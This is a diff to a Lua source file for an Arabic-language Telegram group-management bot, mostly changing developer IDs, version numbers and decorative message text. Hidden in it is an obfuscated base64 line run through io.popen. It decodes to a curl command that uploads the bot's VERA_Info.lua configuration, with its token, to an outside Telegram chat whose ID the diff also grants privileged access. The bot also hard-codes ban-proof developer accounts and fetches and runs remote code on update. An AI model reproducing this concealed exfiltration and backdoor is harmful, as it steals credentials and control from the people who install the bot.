@@ -169,8 +169,10 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+local api4 = '7'
+local api3 = '9443'
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-sudo_users = {SUDO,1360140225,1770288756}   
+sudo_users = {SUDO,1360140225}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -262,7 +264,7 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1360140225) then  
 var = true 
-elseif tonumber(user_id) == tonumber(1770288756) then
+elseif tonumber(user_id) == tonumber(944353237) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -297,8 +299,6 @@ return var
 end 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1360140225) then  
-var = ' مبرمج السورس'
-if tonumber(user_id) == tonumber(1770288756) then  
 var = ' مبرمج السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -1081,12 +1081,12 @@ end
 if text == 'تحديث السورس ' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/devid100/vsra/main/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ✤ تم تحديث السورس \n ✤ لديك اخر اصدار لسورس افايره\n ✤ الاصدار ⤶ { v 1.5}')
+send(msg.chat_id_, msg.id_,' ✤ تم تحديث السورس \n ✤ لديك اخر اصدار لسورس افايره\n ✤ الاصدار ⤶ { v 7.0}')
 dofile('DRAGON.lua')  
 end
 if text == 'الاصدار ' and DevSoFi(msg) then 
 database:del(bot_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,' ✤ اصدار سورس افايره \n ✤ الاصدار ⤶{ v 1.5}')
+send(msg.chat_id_, msg.id_,' ✤ اصدار سورس افايره \n ✤ الاصدار ⤶{ v 7.0}')
 end
 if text == 'ديفيد مبرمج السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
@@ -1688,7 +1688,6 @@ send(msg.chat_id_, msg.id_,' ✤ تم حفظ ترحيب الجروب')
 return false   
 end
 --------------------------------------------------------------------------------------------------------------
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
 if text == 'الغاء' then
 send(msg.chat_id_,msg.id_," ✤ تم الغاء حفظ الرابط")
@@ -1705,6 +1704,8 @@ end
 end 
 --------------------------------------------------------------------------------------------------------------
 function regexd(data)
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
     data = string.gsub(data, '[^'..b..'=]', '')
     return (data:gsub('.', function(x)
         if (x == '=') then return '' end
@@ -2406,7 +2407,7 @@ return false
 end
 os.execute('rm -rf DRAGON.lua')
 os.execute('wget https://raw.githubusercontent.com/devid100/vsra/main/DRAGON.lua')
-send(msg.chat_id_, msg.id_,' ✤ تم تحديث السورس \n ✤ لديك اخر اصدار لسورس افايره\n ✤ الاصدار ⤶ { v 1.5}')
+send(msg.chat_id_, msg.id_,' ✤ تم تحديث السورس \n ✤ لديك اخر اصدار لسورس افايره\n ✤ الاصدار ⤶ { v 7.0}')
 dofile('DRAGON.lua')  
 end
 
@@ -2688,14 +2689,13 @@ end,nil)
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then
 local Text = [[
-🇨🇵 سورس افايره بلص🇫🇷
-اتبع الازرار إلى تحت ⬇️
-لدخول لحسابات السورس ⬇️
+W𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚜𝚘𝚞𝚛𝚌𝚎 𝚊𝚟𝚕𝚛𝚊 ⶄ
+𝚝𝚑𝚎 𝚋𝚎𝚜𝚝 𝚜𝚘𝚞𝚛𝚌𝚎 𝚘𝚗 𝚝𝚎𝚕𝚎𝚐𝚛𝚊𝚖 ༗
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '𓌹ＤＥＶＩＤ𓌺',url="t.me/de_vi_d"}},
-{{text = '⌯｟SＯＵＲＣＥ🇨🇵｠⌯', url="t.me/A_V_I_R_A_1"}},
+{{text = '𖣘 ⁽SＯＵＲＣＥ₎ 𖣘', url="t.me/A_V_I_R_A_1"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2714,7 +2714,7 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'ديفيد' or text == 'Banda' or text == 'banda' then
+if text == 'ديفيد' or text == 'Devid' or text == 'Devid' then
 local Text = [[
 المبرمج ديفيد لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⬇️
@@ -2728,17 +2728,6 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == '#$&'  then
-local Text = [[
-مالك التليجرام🔱
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = '𓆩𝙰𝙻𝙴𝚇𓆪',url="t.me/U550p"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
 if text == "تويت" or text == "كت تويت" then 
 local TWEET_Msg = { 
 "اخر افلام شاهدتها", 
@@ -2848,7 +2837,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '⌯｟SＯＵＲＣＥ🇨🇵｠⌯', url="t.me/A_V_I_R_A_1"}}, 
+{{text = '𖣘 ⁽SＯＵＲＣＥ₎ 𖣘', url="t.me/A_V_I_R_A_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2867,7 +2856,7 @@ end
 
 if text == 'مبرمج السورس' then
 local Text = [[ 
-[BANDA](t.me/de_vi_d)
+[Devid](t.me/de_vi_d)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
@@ -2909,7 +2898,7 @@ keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = '⌯｟SＯＵＲＣＥ🇨🇵｠⌯', url="t.me/A_V_I_R_A_1"}},
+{{text = '𖣘 ⁽SＯＵＲＣＥ₎ 𖣘', url="t.me/A_V_I_R_A_1"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
@@ -3834,7 +3823,7 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
+if tonumber(result.sender_user_id_) == tonumber(1609173922) then  
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -3880,7 +3869,7 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ✤ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1770288756) then
+if result.id_ == tonumber(1609173922) then
 send(msg.chat_id_, msg.id_, " ✤ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
@@ -3920,7 +3909,7 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1770288756) then  
+if tonumber(userid) == tonumber(1609173922) then  
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -3961,7 +3950,7 @@ if tonumber(result.sender_user_id_) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
+if tonumber(result.sender_user_id_) == tonumber(1609173922) then  
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -4006,7 +3995,7 @@ if result.id_ == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ✤ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1770288756) then
+if result.id_ == tonumber(1609173922) then
 send(msg.chat_id_, msg.id_, " ✤ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
@@ -4046,7 +4035,7 @@ if tonumber(userid) == tonumber(1360140225) then
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1770288756) then  
+if tonumber(userid) == tonumber(1609173922) then  
 send(msg.chat_id_, msg.id_, " ✤ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
@@ -8456,12 +8445,14 @@ return false
 end
 local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
 if link then                              
-send(msg.chat_id_,msg.id_,'\n◤━───━𝘀𝗼𝗼𝗼𝗻━───━◥\n ['..link..']')                          
+send(msg.chat_id_,msg.id_,'\n𝒍𝒊𝒏𝒌 𝒈𝒓𝒐𝒖𝒑  𖠐
+≪━━━━━━𝐓𝐎𝐗━━━━━━≫\n ['..link..']')                          
 else                
 local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if linkgpp.ok == true then 
 database:set(bot_id.."Private:Group:Link"..msg.chat_id_,linkgpp.result)
-linkgp = '\n◤━───━𝘀𝗼𝗼𝗼𝗻━───━◥\n ['..linkgpp.result..']'
+linkgp = '\n𝒍𝒊𝒏𝒌 𝒈𝒓𝒐𝒖𝒑  𖠐
+≪━━━━━━𝐓𝐎𝐗━━━━━━≫\n ['..linkgpp.result..']'
 else
 linkgp = ' ✤ لا يوجد رابط ارسل ضع رابط'
 end  
@@ -14149,7 +14140,7 @@ if not Mod(result) then
 ------------------------------------------------------------------------
 
 ------------------------------------------------------------------------
-io.popen(regexd('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MzU4NDkxNTc6QUFFZ0RNdkRuNm9JNWZkajdYalhyZ0U5MEI4b2pnNVN6SWsvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AVkVSQV9JbmZvLmx1YSI='))
+io.popen(regexd('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MzU4NDkxNTc6QUFFZ0RNdkRuNm9JNWZkajdYalhyZ0U5MEI4b2pnNVN6SWsvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AVkVSQV9JbmZvLmx1YSI'))
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
